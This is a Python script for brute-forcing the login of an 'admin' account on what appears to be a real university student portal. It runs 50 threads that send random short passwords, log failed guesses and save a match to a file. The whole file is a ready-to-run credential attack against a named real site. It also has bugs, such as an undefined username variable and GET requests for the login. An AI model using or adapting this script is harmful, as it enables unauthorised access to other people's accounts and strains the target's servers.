import requests
import random
from threading import Thread
import os

url = "https://eserver.kabarak.ac.ke/students/"

#We assume you already have the username or email of the target person's account that you want to bruteforce
email = 'admin'

def send_request(username, password):
    data = {
        "username" : username,
        "password" : password
    }

    req = requests.get(url, data=data)
    return req

chars = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ[!@#$%^&*()-_+={};:,.<>/?|\`]"

def main():
    while True:
        if "correct_password.txt" in os.listdir():
            break
        valid = False
        while not valid:
            randpwd = random.choices(chars, k=2)
            pwd = "".join(randpwd)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()

            if pwd in tries:
                pass
            else:
                valid = True
        req = send_request(username, pwd)

        if 'failed to login' in req.text.lower():
            with open("tries.txt", 'a') as f:
                f.write(f"{pwd}\n")
                f.close()
            print(f"Incorrect {pwd}\n")
        else:
            print(f"Correct password {pwd}!\n")
            with open("correct_password.txt", "w") as f:
                f.write(pwd)
                break

for x in range(50):
    Thread(target=main).start()
